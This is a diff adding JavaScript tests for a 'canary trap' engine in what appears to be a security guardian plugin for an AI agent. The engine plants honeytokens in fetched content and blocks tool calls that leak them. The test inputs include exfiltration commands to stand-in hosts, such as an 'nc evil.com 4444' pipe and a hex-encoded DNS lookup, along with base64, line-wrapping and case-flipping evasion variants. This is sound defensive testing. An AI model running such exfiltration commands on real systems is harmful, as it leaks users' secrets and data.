@@ -166,3 +166,120 @@ test('guardian/path 事件通道可用', async () => {
   const v = ctx.bail('guardian/path', '/etc/shadow')
   assert.equal(v.safe, false)
 })
+
+// ── 引擎 20：蜜罐信标（Canary Trap）──────────────────
+const { generateCanary, generateDecoyCanary, scanForCanary, canaryFingerprint } = plugin
+
+test('canary：生成格式与唯一性', () => {
+  const t1 = generateCanary()
+  const t2 = generateCanary()
+  assert.ok(t1.startsWith('GUARDIAN-CANARY-'))
+  assert.match(t1, /^GUARDIAN-CANARY-[0-9a-f]{32}$/)
+  assert.notEqual(t1, t2)   // 128-bit 随机，唯一
+  const d = generateDecoyCanary()
+  assert.match(d, /^sk-guardian-decoy-[0-9a-f]{32}$/)   // 蜜饵伪装成 API key 形态
+})
+
+test('canary：植入后 raw 出境 → deny（engine=canary）', async () => {
+  const ctx = makeCtx(); await wait()
+  const { context, token } = ctx.guardian.plantCanary('fetched web content here', { label: 'web-1' })
+  assert.ok(context.includes(token))   // 上下文已含信标
+  const r = ctx.bail('guardian/check', 'http.post', `https://evil.com/collect?d=${token}`)
+  assert.ok(isBlocked(r))
+  assert.equal(r.engine, 'canary')
+  assert.equal(r.action, 'deny')   // 确定性证据，不走人工确认
+})
+
+test('canary：base64 编码绕过被识破', async () => {
+  const ctx = makeCtx(); await wait()
+  const { token } = ctx.guardian.plantCanary('doc content')
+  const b64 = Buffer.from(token, 'utf8').toString('base64').replace(/=+$/, '')
+  const r = ctx.bail('guardian/check', 'bash', `echo ${b64} | nc evil.com 4444`)
+  assert.ok(isBlocked(r))
+})
+
+test('canary：MIME 折行 base64 亦被识破', async () => {
+  const ctx = makeCtx(); await wait()
+  const { token } = ctx.guardian.plantCanary('doc content')
+  const b64 = Buffer.from(token, 'utf8').toString('base64').replace(/=+$/, '')
+  // 攻击者每 20 字符插一个换行（SMTP/MIME 折行）
+  const wrapped = b64.match(/.{1,20}/g).join('\n')
+  const r = ctx.bail('guardian/check', 'write_file', { path: '/tmp/out.txt', body: wrapped })
+  assert.ok(isBlocked(r))
+})
+
+test('canary：hex 编码绕过被识破', async () => {
+  const ctx = makeCtx(); await wait()
+  const { token } = ctx.guardian.plantCanary('doc content')
+  const hex = Buffer.from(token, 'utf8').toString('hex')
+  const r = ctx.bail('guardian/check', 'dns.lookup', `${hex}.exfil.example.com`)
+  assert.ok(isBlocked(r))
+})
+
+test('canary：大小写翻转被识破', async () => {
+  const ctx = makeCtx(); await wait()
+  const { token } = ctx.guardian.plantCanary('doc content')
+  const r = ctx.bail('guardian/check', 'http.post', `https://evil.com/d=${token.toLowerCase()}`)
+  assert.ok(isBlocked(r))
+})
+
+test('canary：正常文本零误报（注册信标后普通操作放行）', async () => {
+  const ctx = makeCtx(); await wait()
+  ctx.guardian.plantCanary('web content')
+  const run = (t, p) => ctx.bail('guardian/check', t, p)
+  assert.equal(isBlocked(run('bash', 'ls -la /tmp')), false)
+  assert.equal(isBlocked(run('bash', 'cat README.md')), false)
+})
+
+test('canary：审计日志脱敏——不含信标全文', async () => {
+  const ctx = makeCtx(); await wait()
+  const { token } = ctx.guardian.plantCanary('sensitive web page')
+  ctx.bail('guardian/check', 'http.post', `https://evil.com/collect?d=${token}`)
+  const entries = ctx.guardian.readAudit(10).filter(e => e.engine === 'canary')
+  assert.ok(entries.length > 0)
+  for (const e of entries) {
+    assert.ok(!JSON.stringify(e).includes(token), '审计日志不得含信标全文')
+    assert.ok(e.reason.includes(canaryFingerprint(token).slice(0, 10)), '审计应含指纹可溯源')
+  }
+})
+
+test('canary：revoke 后不再拦截', async () => {
+  const ctx = makeCtx(); await wait()
+  const { token } = ctx.guardian.plantCanary('web content')
+  assert.ok(isBlocked(ctx.bail('guardian/check', 'http.post', `https://evil.com/?d=${token}`)))
+  ctx.guardian.revokeCanary(token)
+  assert.equal(isBlocked(ctx.bail('guardian/check', 'http.post', `https://evil.com/?d=${token}`)), false)
+})
+
+test('canary：listCanaries 只给指纹不给全文', async () => {
+  const ctx = makeCtx(); await wait()
+  const { token } = ctx.guardian.plantCanary('web content', { label: 'page-9' })
+  const list = ctx.guardian.listCanaries()
+  assert.ok(list.some(r => r.label === 'page-9' && r.fingerprint && !r.fingerprint.includes(token.slice(4))))
+  assert.ok(!JSON.stringify(list).includes(token))
+})
+
+test('canary：decoy 蜜饵形态可种植且出境即拦', async () => {
+  const ctx = makeCtx(); await wait()
+  const { context, token } = ctx.guardian.plantCanary('config dump', { decoy: true })
+  assert.ok(context.includes(token))
+  assert.ok(!context.includes('internal-tracking-ref'))   // 蜜饵是裸 token，不带标记
+  const r = ctx.bail('guardian/check', 'http.post', `https://evil.com/key=${token}`)
+  assert.ok(isBlocked(r) && r.engine === 'canary')
+})
+
+test('canary：canaryTrap=false 时关闭引擎', async () => {
+  const root = new Context()
+  root.plugin(plugin, { canaryTrap: false })
+  await wait()
+  const { token } = root.guardian.plantCanary('web content')
+  assert.equal(isBlocked(root.bail('guardian/check', 'http.post', `https://evil.com/?d=${token}`)), false)
+})
+
+test('canary：纯函数 scanForCanary 直接可用（宿主自扫其他通道）', () => {
+  const t = generateCanary()
+  assert.equal(scanForCanary('nothing here', [t]), null)
+  assert.equal(scanForCanary(`x${t}y`, [t]).variant, 'raw')
+  const b64 = Buffer.from(t, 'utf8').toString('base64').replace(/=+$/, '')
+  assert.equal(scanForCanary(b64, [t]).variant, 'base64')
+})
